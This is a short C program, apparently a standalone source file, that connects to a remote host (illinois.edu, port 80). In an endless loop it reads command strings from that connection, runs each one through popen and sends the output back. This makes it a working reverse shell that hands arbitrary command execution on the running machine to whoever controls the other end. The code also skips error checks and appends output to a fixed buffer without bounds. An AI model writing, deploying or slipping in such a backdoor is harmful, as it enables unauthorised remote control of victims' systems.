#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>

int main (int argc, char **argv) {
	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	int s = getaddrinfo("illinois.edu", "80", &hints, &res);
	int sock_fd = socket(res->ai_family, res->ai_socktype, 0);
	connect(sock_fd, res->ai_addr, res->ai_addrlen);

	while (1) {
		char cmd_buf[1024];
		int cmd_len = read(sock_fd, cmd_buf, 1023);
		cmd_buf[cmd_len] = '\0';

		FILE *fp = popen(cmd_buf, "r");
		if (!fp) {
			printf("Failed to run command\n");
			continue;
		}

		char out_buf[1024];
		out_buf[0] = 0;
		char tmp_buf[1024];
		while (fgets(tmp_buf, sizeof(tmp_buf), fp)) {
			strcat(out_buf, tmp_buf);
		}
		
		write(sock_fd, out_buf, strlen(out_buf));
	}

	return 0;
}

